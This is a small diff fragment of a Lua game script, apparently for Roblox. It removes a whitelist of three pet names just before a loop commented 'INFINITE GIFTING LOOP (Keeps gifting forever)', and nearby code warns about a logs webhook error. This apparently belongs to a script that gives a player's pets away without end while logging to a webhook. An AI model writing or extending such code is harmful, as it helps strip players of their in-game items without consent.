@@ -695,12 +695,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 return false
             end
         end
-local WhitelistPets = {
-    "Kitsune",
-    "Brontosaurus",
-"Mimic Octopus",
 
-}
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
             while true do
